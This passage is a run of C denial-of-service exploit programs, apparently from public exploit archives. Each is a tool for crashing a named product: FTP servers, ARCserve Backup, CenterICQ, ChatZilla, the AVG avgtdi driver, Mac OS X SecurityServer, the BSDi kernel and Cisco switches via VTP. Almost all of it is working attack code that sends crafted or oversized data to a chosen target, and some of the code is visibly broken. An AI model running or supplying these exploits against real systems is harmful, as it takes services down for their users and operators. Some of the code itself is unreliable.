        exit(1);
    }
#endif

// milw0rm.com [2004-09-05]/*

by Luigi Auriemma

*/

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>

#ifdef WIN32
    #include <winsock.h>
    #include "winerr.h"

    #define close   closesocket
    #define sleep   Sleep
    #define ONESEC  1000
#else
    #include <unistd.h>
    #include <sys/socket.h>
    #include <sys/types.h>
    #include <arpa/inet.h>
    #include <netinet/in.h>
    #include <netdb.h>

    #define ONESEC  1
#endif

typedef uint8_t     u8;
typedef uint16_t    u16;
typedef uint32_t    u32;



#define VER         "0.1"
#define PORT        41523
#define BUFFSZ      1024



int putsh(u8 *data, u8 *str, int max);
int putcc(u8 *data, int chr, int len);
int putxx(u8 *data, u32 num, int bits);
int timeout(int sock, int sec);
u32 resolv(char *host);
void std_err(void);



int main(int argc, char *argv[]) {
    struct  sockaddr_in peer;
    int     sd,
            len;
    u16     port    = PORT;
    u8      buff[BUFFSZ];

#ifdef WIN32
    WSADATA    wsadata;
    WSAStartup(MAKEWORD(1,0), &wsadata);
#endif

    setbuf(stdout, NULL);

    fputs("\n"
        "CA ARCserve Backup <= 12.0.5454.0 invalid memory access "VER"\n"
        "by Luigi Auriemma\n"
        "e-mail: aluigi@autistici.org\n"
        "web:    aluigi.org\n"
        "\n", stdout);

    if(argc < 2) {
        printf("\n"
            "Usage: %s <host> [port(%hu)]\n"
            "\n", argv[0], port);
        exit(1);
    }

    if(argc > 2) port = atoi(argv[2]);
    peer.sin_addr.s_addr = resolv(argv[1]);
    peer.sin_port        = htons(port);
    peer.sin_family      = AF_INET;

    printf("- target   %s : %hu\n", inet_ntoa(peer.sin_addr), ntohs(peer.sin_port));

    sd = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    if(sd < 0) std_err();
    if(connect(sd, (struct sockaddr *)&peer, sizeof(peer))
      < 0) std_err();

    memset(buff, 0, 0x63);
    putxx(buff,        0x68,                8);     // 0x68 or 0x98 is the same
    putsh(buff + 0x01, "aaaaaaaaaaaaaaaa",  16);
    putsh(buff + 0x19, "bbbbbbbbbbbbbbbb",  16);
    putxx(buff + 0x29, 2,                   16);    // cycle
    putsh(buff + 0x30, "cccccccccccccccc",  2);
    putxx(buff + 0x32, 1,                   16);
    putsh(buff + 0x3f, "dddddddddddddddd",  3);
    putsh(buff + 0x46, "eeeeeeeeeeeeeeee",  9);
    putsh(buff + 0x53, "ffffffffffffffff",  16);
    putxx(buff + 0x32 + 8, 0x7fffffff,      32);    // BOOM

    printf("- send data\n");
    send(sd, buff, 0x63, 0);

    while(!timeout(sd, 3)) {
        len = recv(sd, buff, BUFFSZ, 0);
        if(len <= 0) break;
    }

    close(sd);
    printf("- done\n");
    return(0);
}



int putsh(u8 *data, u8 *str, int max) {
    strncpy(data, str, max);
    data[max - 1] = 0;
    return(max);
}



int putcc(u8 *data, int chr, int len) {
    memset(data, chr, len);
    return(len);
}



int putxx(u8 *data, u32 num, int bits) {
    int     i,
            bytes;

    bytes = bits >> 3;
    for(i = 0; i < bytes; i++) {
        data[i] = (num >> (i << 3)) & 0xff;
    }
    return(bytes);
}



int timeout(int sock, int sec) {
    struct  timeval tout;
    fd_set  fd_read;
    int     err;

    tout.tv_sec  = sec;
    tout.tv_usec = 0;
    FD_ZERO(&fd_read);
    FD_SET(sock, &fd_read);
    err = select(sock + 1, &fd_read, NULL, NULL, &tout);
    if(err < 0) std_err();
    if(!err) return(-1);
    return(0);
}



u32 resolv(char *host) {
    struct  hostent *hp;
    u32     host_ip;

    host_ip = inet_addr(host);
    if(host_ip == INADDR_NONE) {
        hp = gethostbyname(host);
        if(!hp) {
            printf("\nError: Unable to resolv hostname (%s)\n", host);
            exit(1);
        } else host_ip = *(u32 *)hp->h_addr;
    }
    return(host_ip);
}



#ifndef WIN32
    void std_err(void) {
        perror("\nError");
        exit(1);
    }
#endif


source: http://www.securityfocus.com/bid/23629/info

Cdelia Software ImageProcessing is prone to a denial-of-service vulnerability because the application fails to handle exceptional conditions.

An attacker can exploit this issue to crash the affected application, denying service to legitimate users. 

 **********************************
 ## Exploit Coded By Dr.Ninux ##
 ##       www.LeZr.com        ##
 ##  LeZr.com Security Team   ##
 ##    Dr.Ninux@bsdmail.org   ##
 **********************************
 ## 24 April 2007 , Tuesday
 ## This exploit will create an image (bmp)
 ## try to open it with "ImageProcessing" from Cdelia Software co.
 ## then the program will be die...!
 **********************************
 ##
 ## grEEts to:
 ## Dr.Virus9,Qptan(Linux_Drox),Q8trojan,BataWeel,SAUDI,RoDhEDoR,
 ## Arab4services.com,The_DoN,aseer-alnjoom,Maxy,hacaar...AND milw0rm.com
 ##
 */
 #include <stdio.h
 #include <stdlib.h

 #define INV_PIC "die.bmp"

 int main()
 {

       int i=0;
       char inv_[]="LOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOL";
       FILE* inv_pic;

       printf("\t\t**********************************\n");
    printf("\t\t  ## Exploit Coded By Dr.Ninux ##\n");
    printf("\t\t  ##       www.LeZr.com        ##\n");
    printf("\t\t  ##  LeZr.com Security Team   ##\n");
    printf("\t\t  ##    Dr.Ninux@bsdmail.org   ##\n");
    printf("\t\t**********************************\n");
    printf("\n");

       if((inv_pic=fopen(INV_PIC,"wb"))==NULL)
       {
               printf("error:foepn().\n");
               exit(0);
       }

       printf("[+]Creating |invalid picture| ... plz wait.\n");

       for(i=0;i<sizeof(inv_);i++)
       {
               fputc(inv_[i],inv_pic);
       }

       fclose(inv_pic);
       printf("[+]BMP File %s Successfuly Created...\n",INV_PIC);

       return 0;
 }
/*

by Luigi Auriemma

*/

#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#ifdef WIN32
    #include <winsock.h>
    #include "winerr.h"

    #define close   closesocket
    #define ONESEC  1000
#else
    #include <unistd.h>
    #include <sys/socket.h>
    #include <sys/types.h>
    #include <arpa/inet.h>
    #include <netinet/in.h>
    #include <netdb.h>

    #define ONESEC  1
#endif



#define VER     "0.1"
#define BUFFSZ  2048
#define PORT    24711
#define TIMEOUT 3
#define INFO    "\x3D\x00\x00\x00\x00\x3D\x00\x00"  // pre-built
#define BOOM    ""  // 0 bytes, a cool bug

#define SEND(x) if(sendto(sd, x, sizeof(x) - 1, 0, (struct sockaddr *)&peer, sizeof(peer)) \
                  < 0) std_err();
#define RECV    if(timeout(sd) < 0) { \
                    fputs("\n" \
                        "Error: socket timeout, no reply received\n" \
                        "\n", stdout); \
                    exit(1); \
                } \
                len = recvfrom(sd, buff, BUFFSZ, 0, NULL, NULL); \
                if(len < 0) std_err();



int timeout(int sock);
u_long resolv(char *host);
void std_err(void);



int main(int argc, char *argv[]) {
    int     sd,
            len;
    u_short port = PORT;
    u_char  buff[BUFFSZ];
    struct  sockaddr_in peer;


    setbuf(stdout, NULL);

    fputs("\n"
        "Codename Eagle <= 1.42 socket unreacheable "VER"\n"
        "by Luigi Auriemma\n"
        "e-mail: aluigi@autistici.org\n"
        "web:    http://aluigi.altervista.org\n"
        "\n", stdout);

    if(argc < 2) {
        printf("\n"
            "Usage: %s <host> [port(%d)]\n"
            "\n", argv[0], port);
        exit(1);
    }

#ifdef WIN32
    WSADATA    wsadata;
    WSAStartup(MAKEWORD(1,0), &wsadata);
#endif

    if(argc > 2) port = atoi(argv[2]);
    peer.sin_addr.s_addr = resolv(argv[1]);
    peer.sin_port        = htons(port);
    peer.sin_family      = AF_INET;

    printf("- target   %s : %hu\n",
        inet_ntoa(peer.sin_addr), port);

    sd = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
    if(sd < 0) std_err();

    fputs("- check server\n", stdout);
    SEND(INFO);
    RECV;

    if(*buff != 0x3d) {
        fputs("- server doesn't seem a valid Codename Eagle server, I continue\n", stdout);
    } else {
        printf("\n  Map:   %s\n\n", buff + 8);
    }

    fputs("- send BOOM packet\n", stdout);
    SEND(BOOM);

    sleep(ONESEC);

    fputs("- check if the server is vulnerable:\n", stdout);
    SEND(INFO);

    if(timeout(sd) < 0) {
        fputs("\nServer IS vulnerable!!!\n\n", stdout);
    } else {
        fputs("\nServer doesn't seem vulnerable\n\n", stdout);
    }

    close(sd);

    return(0);
}



int timeout(int sock) {
    struct  timeval tout;
    fd_set  fd_read;
    int     err;

    tout.tv_sec = TIMEOUT;
    tout.tv_usec = 0;
    FD_ZERO(&fd_read);
    FD_SET(sock, &fd_read);
    err = select(sock + 1, &fd_read, NULL, NULL, &tout);
    if(err < 0) std_err();
    if(!err) return(-1);
    return(0);
}



u_long resolv(char *host) {
    struct hostent *hp;
    u_long host_ip;

    host_ip = inet_addr(host);
    if(host_ip == INADDR_NONE) {
        hp = gethostbyname(host);
        if(!hp) {
            printf("\nError: Unable to resolv hostname (%s)\n", host);
            exit(1);
        } else host_ip = *(u_long *)hp->h_addr;
    }
    return(host_ip);
}




#ifndef WIN32
    void std_err(void) {
        perror("\nError");
        exit(1);
    }
#endif


source: http://www.securityfocus.com/bid/15649/info

CenterICQ is prone to a remote denial-of-service vulnerability.

The vulnerability presents itself when the client is running on a computer that is directly connected to the Internet and handles malformed packets on the listening port for ICQ messages.

A successful attack can cause the client to crash. 

#include <string.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>

#define DEST_IP   "192.168.1.33"
#define DEST_PORT 7777

    main()
    {
        int sockfd;
        struct sockaddr_in dest_addr;   // will hold the destination addr

        sockfd = socket(AF_INET, SOCK_STREAM, 0); // do some error checking!

        dest_addr.sin_family = AF_INET;          // host byte order
        dest_addr.sin_port = htons(DEST_PORT);   // short, network byte order
        dest_addr.sin_addr.s_addr = inet_addr(DEST_IP);
        memset(&(dest_addr.sin_zero), '\0', 8);  // zero the rest of the struct

        // don't forget to error check the connect()!
        connect(sockfd, (struct sockaddr *)&dest_addr, sizeof(struct sockaddr));
	char *msg[] = { 0x01 };
	send(sockfd, msg, 1, 0);
}
source: http://www.securityfocus.com/bid/8793/info

A problem has been reported in the handling of overly long HTTP version string data by Centrinity FirstClass. Because of this, it may be possible for an attacker deny service to legitimate users of a vulnerable system. This may be due to an exploitable boundary condition error, though this is not confirmed.

/*******************************************
 * FirstClass Internet Services Remote DoS *
 *******************************************

discovered & coded by I2S-LAB

 --------------------------------------------

This exploit uses a ptr overflow to remotely
shutdown the Internet Services of FirstClass.


  CONTACT
  _______

  Fred CHAVEROT : fred[at]I2S-LAB.com
  Aur=E9lien BOUDOUX : aurelien[at]I2S-LAB.com


  URL : http://www.I2S-LaB.com

 *******************************************/


#include <windows.h>
#include <winsock.h>
#pragma comment (lib,"wsock32.lib")

#define PerfectOverwrite 246

void main (int argc, char *argv[])
{

int len;
SOCKET sock1;
SOCKADDR_IN sin;
char *sav;

WSADATA wsadata;
WORD wVersionRequested = MAKEWORD (2,0);

printf ("- FirsClass Internet Services Remote DoS -\n\n"
"Discovered & coded by I2S-LAB\n"
"http://www.I2S-LaB.com\n\n");


if (!argv[1])
{
printf ("Usage : %s <IP Address>\n", argv[0]);
ExitProcess (0);
}

if (WSAStartup(wVersionRequested, &wsadata) ) ExitProcess (0);

if (!(sav = (char *) LocalAlloc (LPTR, 20 + PerfectOverwrite)) )
{
printf ("Error ! cannot allocate enough memory.\n");
ExitProcess (0);
};

lstrcat (sav, "GET / HTTP/1.1");
memset (&sav[14], 'A', PerfectOverwrite - 4);
lstrcat (sav,"DDDD\r\n\r\n");

sin.sin_family = AF_INET;
sin.sin_port = htons (80);

if ( (sin.sin_addr.s_addr=inet_addr (argv[1])) == INADDR_NONE)
{
printf ("Incorrect IP Address : %s\n", argv[1]);
ExitProcess(0);
}

sock1 = socket (AF_INET, SOCK_STREAM, 0);

printf ("\nconnecting to %s...", argv[1]);

if ( connect (sock1,(SOCKADDR *)&sin, sizeof (sin)) == SOCKET_ERROR )
printf ("connection failed!\n");

else
{
printf ("ok!\nSending crafted request...");

send (sock1,sav, PerfectOverwrite + 18,0);
puts ("ok!");
}

closesocket (sock1);
}
/*
Cerberus FTP Server 2.32 Denial of Service
original advisory: http://kapda.ir/advisory-210.html
cerberus_232_dos_remote_xpl.c
*/

#include <stdio.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <netinet/in.h>
#include <netdb.h>

#define  POCSTR "%s"

int header();
int usage(char *filename);
int remote_connect( char* ip, unsigned short port );

int header() {
printf("\n[i] KAPDA - Computer Security Science Researchers Institute\n\n");
printf("[i] Title:              \tCerberus FTP Server <= v2.32 Dos Exploit\n");
printf("[i] Discovered by:      \tcvh {a] kapda.ir\n");
printf("[i] Exploit by:         \tPi3cH {a] kapda.ir\n");
printf("[i] More info:          \twww.kapda.ir/page-advisory.html\n\n");
return 0;
}

int usage(char *filename) {
printf("[i] Usage:   \t%s HOST PORT\n",filename);
printf("[i] Example: \t%s 127.0.0.1 21\n\n",filename);
exit(0);
}

int remote_connect( char* ip, unsigned short port )
{
int s;
struct sockaddr_in remote_addr;
struct hostent* host_addr;

memset ( &remote_addr, 0x0, sizeof ( remote_addr ) );
if ( ( host_addr = gethostbyname ( ip ) ) == NULL )
{
printf ( "[e] Cannot resolve \"%s\"\n", ip );
exit ( 1 );
}
remote_addr.sin_family = AF_INET;
remote_addr.sin_port = htons ( port );
remote_addr.sin_addr = * ( ( struct in_addr * ) host_addr->h_addr );
if ( ( s = socket ( AF_INET, SOCK_STREAM, 0 ) ) < 0 )
{
printf ( "[e] Socket failed!\n" );
exit(1);
}
if ( connect ( s, ( struct sockaddr * ) &remote_addr, sizeof ( struct sockaddr ) ) ==  -1 )
{
printf ( "[e] Failed connecting!\n" );
       exit(1);
}
return ( s );
}


int main(int argc, char *argv[]) {
 int s,i;
 char *request;
 char junk_data[] = "DoS-JUNK-DATA.:(CVH):.\x0d\x0a";
 header();
 if( (argc < 2) )
     usage(argv[0]);
 request = (char *) malloc(1024);
 printf("[r] Connecting to remote host\n");
 s = remote_connect(argv[1],atoi(argv[2]));
 sleep(1);
 printf("[r] Creating buffer\n");
 sprintf(request,POCSTR,junk_data);
 printf("[r] Sending %d bytes of DOS buffer\n",strlen(request));
 for(i=0;i<50000;i++)
  if ( send ( s, request, strlen (request), 0) <= 0 )
  {
          printf("[e] Failed to send buffer\n");
          close(s);
          exit(1);
  }
 sleep(1);
 printf("[s] Exploit Done!\n");
 close(s);
 free(request);
 request = NULL;
 return 0;
}

// milw0rm.com [2006-01-16]
/*

vulnerab         : Remote Denial of Service 
Command vulnerab : User
Software         : Cerberus FTP Server
Versian          : 3.0.3
website software : http://www.cerberusftp.com

greetz : *Str0ke*

Milw0rm is The best in world

*/


#include <stdio.h>
#include <string.h>
#include <winsock2.h>
#include <stdlib.h>
#include <conio.h>
#pragma comment(lib, "ws2_32.lib")
#define size 520



int main(int argc, char *argv[])
{

	int cer1,cer2,cer3;
	char buffer[size];

  if (argc < 2)
{
   printf("\n\n Cerberus FTP Server V 3.0.3 Remote Denial Of Service Exploit \n\n");
   printf("\n u  : file ip \n");
   printf("\n EX : Cerberus.exe 127.0.0.1 \n");
   exit(-1);
}
  memset(buffer,"A",520);

	WSADATA wsaData;

  if(WSAStartup (MAKEWORD(2,1),&wsaData) != 0)
  {
	  printf("WSAStartup is failed \n");
	  exit(-1);
  }
 	struct hostent * remote;

 remote = gethostbyname(argv[1]);
 if(! remote)
 {
	 cer1 = inet_addr(argv[1]);
 }
 if (!remote) && (cer1 == INADDR_NONE))
 {
	    printf("Unable to resolve %s\n",argv[1]);
        exit(-1);
 }

 cer2 = socket(AF_INET,SOCKET_STREAM,IPPROTO_TCP);
 if(cer2 == INVALID_SOCKET)
 {
	 printf("\n Error On Create Socket \n");
	 exit(-1);
 }

    struct sockaddr_in ftp;
    if (remote != NULL)
   memcpy(&(ftp.sin_addr),remote->h_addr,remote->h_length);
  else
   ftp.sin_addr.s_addr = addr;
  if (remote)
   ftp.sin_family = remote->h_addrtype;
  else
   ftp.sin_family = AF_INET;
  ftp.sin_port=htons(21);

printf("\n Denial of service FTP server %s \n",argv[1]);
printf("\n Sending Packet\n");
Sleep(1000);
printf("\n packet size = %d byte\n" , sizeof(buffer));
printf("\n Please Wait ... \n");

cer3 = connect (cer2, (struct Sockaddr *), &ftp, sizeof (struct Socketaddr_in));
if(cer3 == 0)
{
	printf("\n again please wait...\n");

 Sleep(500);

	printf("\n c0nnect3d\n");


	send(cer2 , buffer , sizeof(buffer) , 0);
	printf("\n\n Cerberus FTP Server Have been Crashed ! \n\n");
}
else 
{
	printf("\n Cerberus FTP Server not listen in port \n");
}

return 0;
}

// milw0rm.com [2009-09-14]
/*
*-----------------------------------------------------------------------
*
* cesarftp.c - Cesar FTP Server Long Command DoS Exploit
*
* Copyright (C) 2000-2004 HUC All Rights Reserved.
*
* Author : lion
* : lion@cnhonker.net
* : http://www.cnhonker.com
* Date : 2004-08-30
*
*-----------------------------------------------------------------------
*/

#include <stdio.h>
#include <stdlib.h>
#include <winsock2.h>

#pragma comment(lib, "ws2_32.lib")

#define BUFFSIZE 204800
#define SIZE 5000

// function
int create_socket();
int client_connect(int sockfd,char* server,int port);
int writebuf(char *s,int socket,char *buffer,int len);
int readbuf(char *s,int socket,char *buffer,int len);

int show = 1;
char recvbuf[BUFFSIZE];
char sendbuf[BUFFSIZE];

void main(int argc, char *argv[])
{
WSADATA wsa;
unsigned short port;
unsigned long ip;

SOCKET s;
int size = SIZE;

printf("Cesar FTP Server Long Command DoS Exploit\r\n");
printf("lion lion#cnhonker.net, http://www.cnhonker.com\r\n\n");

if(argc < 3)
{
printf("%s <TargetHost> <TargetPort>\r\n", argv[0]);
return;
}

WSAStartup(MAKEWORD(2,2),&wsa);

if((s=create_socket())==0)
{
printf("[-] ERROR: Create socket failed.\r\n");
return;
}

if(!client_connect(s, argv[1], atoi(argv[2])))
exit(-1);

readbuf("read", s, recvbuf, BUFFSIZE);

memset(sendbuf, 0, BUFFSIZE);
memset(sendbuf, 'A', size);

sendbuf[size-2] ='\r';
sendbuf[size-1] ='\n';

while(1)
{
show=1;
writebuf("Send Buff", s, sendbuf, size);
readbuf("read", s, recvbuf, BUFFSIZE);
Sleep(1000);
}

if(s)
closesocket(s);

WSACleanup();
}

int create_socket()
{
int sockfd;

sockfd=socket(AF_INET,SOCK_STREAM,0);
if(sockfd<0)
{
printf("[-] Create socket error.\r\n");
return(0);
}

return(sockfd);
}

int client_connect(int sockfd,char* server,int port)
{
struct sockaddr_in cliaddr;
struct hostent *host;

if((host=gethostbyname(server))==NULL)
{
printf("[-] ERROR: gethostbyname(%s) error\n", server);
return(-1);
}

memset(&cliaddr, 0, sizeof(struct sockaddr));

cliaddr.sin_family=AF_INET;
cliaddr.sin_port=htons(port);
cliaddr.sin_addr=*((struct in_addr *)host->h_addr);
printf("[+] Trying %s:%d......", server, port);
fflush(stdout);

if(connect(sockfd,(struct sockaddr *)&cliaddr,sizeof(struct sockaddr))<0)
{
printf("FAILED!\r\n");
closesocket(sockfd);
return(-1);
}

printf("OK!\r\n");
return(1);
}

int writebuf(char *s,int socket,char *buffer,int len)
{
int j;

if(s)
{
printf("[+] %s......", s);
fflush(stdout);
}

j=send(socket,buffer,len,0);
if(j<=0)
{
printf("FAILED!\r\n");
exit(-1);
}
printf("OK!\r\n");
return j;
}

int readbuf(char *s,int socket,char *buffer,int len)
{
int a,b,i,j=0;

a=b=i=0;
memset(buffer,0,len);

if(s)
{
printf("[+] %s......", s);
fflush(stdout);
}

j=recv(socket,buffer,len-1,0);
if(j <= 0)
{
if(s) printf("FAILED!\n");
printf("[-] Recv data error.\n");
exit(-1);
}

if(s) printf("OK!\n");

buffer[len-1]='\0';

if(show==1) printf("<==\r\n%s<==\r\n",buffer);

return j;
}

// milw0rm.com [2004-08-31]
source: http://www.securityfocus.com/bid/28066/info

ADI Convergence Galaxy FTP Server is prone to a denial-of-service vulnerability because the application fails to perform adequate boundary checks on user-supplied data.

An attacker can exploit this issue to crash the affected application, denying service to legitimate users. Given the nature of this issue, remote code execution may also be possible, but this has not been confirmed.

ADI Convergence Galaxy FTP Server 0.1 is vulnerable; other versions may also be affected. 

#include <sys/types.h> 
#include <sys/socket.h> 
#include <netinet/in.h> 
#include <arpa/inet.h> 
#include <netdb.h> 
#include <stdio.h> 
#include <unistd.h> 
#include <string.h> 

int port=21; 
struct hostent *he; 
struct sockaddr_in their_addr; 



int konekt(char *addr) 
{ 
  int sock; 

  he=gethostbyname(addr); 
  if(he==NULL) 
  { 
    printf("Unknow host!\nexiting..."); 
    return -1; 
  } 
  if ((sock = socket(AF_INET, SOCK_STREAM, 0)) == -1) 
  { 
    perror("socket"); 
    return -2; 
  } 

  their_addr.sin_family = AF_INET;    
  their_addr.sin_port = htons(port);  
  their_addr.sin_addr = *((struct in_addr *)he->h_addr); 
  memset(&(their_addr.sin_zero), '\0', 8); 
  if (connect(sock, (struct sockaddr *)&their_addr, 
      sizeof(struct sockaddr)) == -1) 
  { 
    perror("connect"); 
    return -1; 
  } 

  return sock; 
} 

int main(int argc,char *argv[])
{
	
printf("\n+===============================Yeah======================================+");
	printf("\n+= ADI Convergence Galaxy FTP Server v1.0 (Neostrada 
Livebox DSL Router) =+");
	printf("\n+=               Remote Buffer Overflow DoS Exploit                      
=+");
	printf("\n+=                              bY                                       
=+");
	printf("\n+=        Maks M. [0in] From Dark-CodeRs Security & 
Programming Group!   =+");
        printf("\n+=                    0in(dot)email[at]gmail(dot)com                     
=+");
        printf("\n+=               Please visit: 
http://dark-coders.4rh.eu                 =+");
        printf("\n+=      Greetings to: Die_Angel, Sun8hclf, M4r1usz, 
Aristo89, Djlinux    =+");
	printf("\n+=                    MaLy, Slim, elwin013, 
Rade0n3900, Wojto111,        =+");
        printf("\n+=                    Chomzee, AfroPL, Joker186                          
=+");
	
printf("\n+===============================Yeah======================================+");

	if(argc<2)
	{
		printf("\nUse %s [IP]!\n",argv[0]);
		exit(0);
	}
	printf("\nConnecting to:%s...",argv[1]);
int sock=konekt(argv[1]);
if(sock<0)
{
	printf("\neh...");
	exit(0);
}
printf("\nConnected!!\n");
char rcv[256];
recv(sock,rcv,255,0);
printf("\n%s\n",rcv);
printf("\nSending evil buffer..");
char evil[100*100]="%n\x01\x02\x03\x04";
int i;
for(i=0;i<(100*100)-100;i++)
{
	strcat(evil,"A");
}

strcat(evil,"\r\n");
send(sock,evil,strlen(evil),0);
strcpy(rcv,"");
recv(sock,rcv,255,0);
printf("\n%s\n",rcv);
char pass[100*1000]="PASS ";
strcat(pass,evil);
strcat(pass,"\n\r");
send(sock,pass,strlen(pass),0);
strcpy(rcv,"");
recv(sock,rcv,255,0);
printf("\n%s\n",rcv);
printf("\nOK!\nYou're Livebox FTP server should fu**ed out...");

exit(0);
}
source: http://www.securityfocus.com/bid/9332/info

Apple MacOS X SecurityServer has been reported prone to a denial of service vulnerability that may be triggered by a local user. The issue may be triggered under certain circumstances when a large password for a SecKeychainUnlock() call is specified under certain circumstances.

It has been reported that this activity will cause the SecurityServer to crash. The server appears to crash during a memory copy operation, potentially resulting in memory corruption. This could possibly allow for execution of arbitrary code, though this possibility has not been confirmed. 

#include <Security/Security.h>
int main(int argc, const char *argv[])
{
    SecKeychainRef defaultKeychain;
    SecKeychainCopyDefault(&defaultKeychain);
    SecKeychainLock(defaultKeychain);
    SecKeychainUnlock(defaultKeychain, 0xFFFFFFFF, "password", true);
    return 0;
}

/*
# Exploit Title: AVG Internet Security 0day Local DoS Exploit
# Date: 2010-11-01 
# Author: Nikita Tarakanov (CISS Research Team)
# Software Link: http://www.avg.com
# Version: up to date, version 9.0.851, avgtdix.sys version 9.0.0.832
# Tested on: Win XP SP3
# CVE : CVE-NO-MATCH
# Status : Unpatched
*/

#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <io.h>
#include <fcntl.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <errno.h>
#include <share.h>



int main(int argc, char **argv)
{
	HANDLE   hDevice;
	DWORD    cb;
	void		*buff;
	int outlen = 0x18, inlen = 0x10;
	DWORD ioctl = 0x830020C8;
	char deviceName[] = "\\\\.\\avgtdi";
	char logName[] = "avgtdi.log";

	if ( (hDevice = CreateFileA(deviceName, 
						  GENERIC_READ|GENERIC_WRITE,
						  0,
						  0,
						  OPEN_EXISTING,
						  0,
						  NULL) ) != INVALID_HANDLE_VALUE )
	{
		printf("Device  succesfully opened!\n");
	}
	else
	{
		printf("Error: Error opening device \n");
		return 0;
	}

	cb = 0;
	buff = malloc(0x1000);
	if(!buff){
	  printf("malloc failed");
	  return 0;
	}
	memset(buff, 'A', 0x1000-1);



	DeviceIoControl(hDevice, ioctl, (LPVOID)buff, inlen, (LPVOID)buff, outlen, &cb, NULL);

	free(buff);
}

source: http://www.securityfocus.com/bid/3220/info

It has been reported that there is a locally exploitable vulnerability in BSDI.

It is allegedly possible for a userland process to cause the kernel to halt.

This may be due to a bad system call. 

/* (BSDi)*[v3.0/3.1] system failure, by
   v9[v9@realhalo.org].  this will result
   in the ability of any user to fail the
   system, and reboot it.  this bug is
   similar to that of the "f00f" bug.
   results are similar, except this reboots
   the machine instead of having a freezing
   effect.  tested, and built for: BSDi
   v3.0/3.1. (arch/non-specific to BSDi)
*/
char bsdi_killcode[] =
 "\xb8\x8f\xf8\xff\x0b\xf7\xd0\x50\xb0\x0b"
 "\xb0\x9a\x50\x89\xe7\xff\xd7";
int main() {
 void (*execcode)()=(void *)bsdi_killcode;
 printf("[ (BSDi)*[v3.0/3.1]: system failu"
 "re, by: v9[v9@realhalo.org]. ]\n");
 printf("*** no output should be seen afte"
 "r this point.\n");
 execcode();
 printf("*** system failure failed.\n");
 exit(0);
}
source: http://www.securityfocus.com/bid/8627/info

It has been reported that ChatZilla is prone to a denial of service vulnerability. The problem arises as a remote attacker posing as an IRC server sends specially crafted requests to the client containg large strings.

If successful, an attack would lead to a denial of service in the client software.

It is not known if this condition could also be exploited to execute arbitrary code on the client.

ChatZilla versions 0.8.23 and prior are reported to be prone to this issue. 

/*
 *  ChatZilla <=v0.8.23 remote DoS exploit
 *
 *  by m00 Security // www.m00security.org
 *
 *  This sploit creats a fake irc-server on any port. Every connected
 *  ChatZilla-client will have cpu-usage 100%.
 *
 *  Complete advisory:
 *  www.m00security.org/adv/adv003.txt
 *
 *  -d4rkgr3y [d4rk@securitylab.ru]
 */

#include<sys/types.h>
#include<sys/socket.h>
#include<netinet/in.h>
#include<arpa/inet.h>
#include<unistd.h>
#include<signal.h>
#include<stdio.h>
#include<stdlib.h>
#include<string.h>

#define COUNT 60000
#define request "NOTICE AUTH :*** Welcome to fake m00 IRCd\n"

int main(int argc, char **argv)
{
        struct sockaddr_in db;
        int sock, i, len, lame;
        const c = COUNT;
        char buf[60000] = ":Serv 000 user666 :Welcome to the underworld";
        printf("\nChatZilla <=v0.8.23 remote DoS exploit // 
www.m00security.org\n\n");
        if (argc!=2){
                printf("[-] error in params. Usage\n %s port\n",argv[0]);
                exit(1);
        } else {
                printf("[~] Generating evil buf....");
        }
        /* constructing evil buf */
        for (i=0;i<c;i++)
        {
                strcat(buf,"A");
        }
        strcat(buf,"\n");
        printf(" OK\n");
        /* creating fake irc-server */
        db.sin_family = AF_INET;
        db.sin_addr.s_addr = INADDR_ANY;
        db.sin_port = htons(atoi(argv[1]));
        sock = socket(PF_INET, SOCK_STREAM, 0);
        if(bind(sock, (struct sockaddr*)&db, sizeof(db)) == -1) {
                perror("[-] bind()");
                _exit(0);
        }
        /* OK */
        printf("[+] fake ircd created on port %s\n",argv[1]);
        /* waiting for connect */
        listen(sock, SOMAXCONN);
        while(1) {
                printf("[+] User connected. Attacking....");
                len = sizeof(db);
                lame = accept(sock, (struct sockaddr*)&db, &len);
                /* go go go */
                write(lame,request,strlen(request));
                write(lame,buf,strlen(buf));
                printf(" OK\n");
                close(lame);
                close(sock);
                return(0);
        }
}

/*DoS code for Cisco VLAN Trunking Protocol Vulnerability
 *
 *vulerability discription:
 *http://www.cisco.com/warp/public/707/cisco-sr-20081105-vtp.shtml
 *
 *To Known:
 * 1.the switch must in Server/Client Mode.
 * 2.the port ,attacker connected,must be in trunk Mode.
 *   Cisco Ethernet ports with no configuration are not
 *   in trunk.but trunk mode can be obtained through DTP
 *   attack by Yersinia.
 * 3.you must known the vtp domain,this can be sniffed
 * 4.some codes are from Yersinia.
 *
 *Result:
 * switch reload.
 *
 *
 *Compile:
 * gcc -o vtp `libnet-config --libs` vtp.c
 *
 *Usage:vtp -i <interface> -d <vtp_domain>
 *
 *Contact: showrun.lee[AT]gmail.com
 *http://sh0wrun.blogspot.com/
 */
#include <libnet.h>
#include <stdio.h>
#include <stdlib.h>

#define VTP_DOMAIN_SIZE    32
#define VTP_TIMESTAMP_SIZE 12

struct vtp_summary {
     u_int8_t  version;
     u_int8_t  code;
     u_int8_t  followers;
     u_int8_t  dom_len;
     u_int8_t  domain[VTP_DOMAIN_SIZE];
     u_int32_t revision;
     u_int32_t updater;
     u_int8_t  timestamp[VTP_TIMESTAMP_SIZE];
     u_int8_t  md5[16];
};

struct vtp_subset {
     u_int8_t  version;
     u_int8_t  code;
     u_int8_t  seq;
     u_int8_t  dom_len;
     u_int8_t  domain[VTP_DOMAIN_SIZE];
     u_int32_t revision;
};

void usage( char *s) {
    printf("%s -i <interface> -d <vtp domain>\n",s);
    exit (1);
}

int main( int argc, char *argv[] )
{
    int opt,k=0;
    extern char *optarg;
    libnet_ptag_t t;
    libnet_t *lhandler;
    u_int32_t vtp_len=0, sent;
    struct vtp_summary *vtp_summ;
    struct vtp_subset *vtp_sub;
    u_int8_t *vtp_packet,*vtp_packet2, *aux;
    u_int8_t cisco_data[]={ 0x00, 0x00, 0x0c, 0x20, 0x03 };
    u_int8_t dst_mac[6]={ 0x01,0x00,0x0c,0xcc,0xcc,0xcc };
